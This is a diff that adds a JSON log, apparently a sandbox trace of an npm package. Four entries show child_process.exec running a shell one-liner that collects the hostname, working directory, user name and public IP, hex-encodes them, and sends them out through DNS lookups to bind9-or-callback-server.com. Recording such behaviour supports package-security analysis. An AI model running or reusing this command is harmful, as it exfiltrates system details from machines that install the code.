@@ -1,0 +1,8 @@
+{"timestamp":1748960668515,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
+{"timestamp":1748960668519,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
+{"timestamp":1748960772255,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
+{"timestamp":1748960772260,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
+{"timestamp":1748960913371,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
+{"timestamp":1748960913375,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
+{"timestamp":1749010050059,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
+{"timestamp":1749010050066,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
